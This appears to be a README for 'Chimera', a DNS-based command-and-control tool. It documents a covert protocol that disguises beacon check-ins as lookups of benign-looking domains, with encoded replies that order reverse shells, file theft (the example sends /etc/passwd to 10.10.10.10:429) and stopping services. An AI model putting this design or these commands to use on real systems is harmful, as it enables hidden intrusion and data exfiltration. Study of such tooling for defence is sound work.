Chimera is a C2 implementation utilizing DNS queries/responses to transfer messages and data.

Files:

server.py - hosts the main Chimera C2 server, handles beacon calls and messaging
client.py - runs on target machine(s), calls back to the server and receives messages from it
attacker.py - runs seperate from the server, queries the server for active beacons and sends commands to the server for beacons to execute
serverlistener.py - listens for commands from instances of attacker.py, records the commands in their respective beacon files


Legend:


Queries and their Meaning:

"supportcenter.net" - Client checkin (response A)
"freegames.net" - Client heartbeat (response A)
"securelogin.com" - Send reverse shell to address/port (response B)
"cloudlogin.com" - Send file contents to address/port (response B)
"fileshare.org" - Ready for filename (response C)
"cloudvault.org" - Ready for servicename (response C)


Responses and their Meaning:

x.x.x.100 - Standby / Sleep
x.x.x.232 - Prepare for reverse shell
x.x.x.85 - Collect file contents
x.x.x.150 - Stop service


Response Formats:

Response A - Single IP from standard responses
Response B - Responds with 2 addresses:
	IP address to send reverse shell/data to (ie. 10.10.10.10)
	IP address of format y1.y2.x.3, where the port to transmit on is defined as y1+y2 *Note: port capped at 510*
Response C - Responds with any number of addresses:
	Each quartet of the address is translated into it's ascii character until the value "3" is reached
	Designates a filename or service name
	

Beacon Commands: *Found in the beacon's file located on the server. CAUTION: Do not edit the beacon file directly unless you know exactly what you're doing. Errors can cause the beacon to crash*

"shell" - Reverse shell
	- Next line will contain ip:port to send the shell to, ie. 10.10.10.10:429
"file" - Collect file contents
	- Next lines will be filename first, ip:port to send to second. Example:
		/etc/passwd
		10.10.10.10:429
"service" - Stop service
	- Next line will contain service name to stop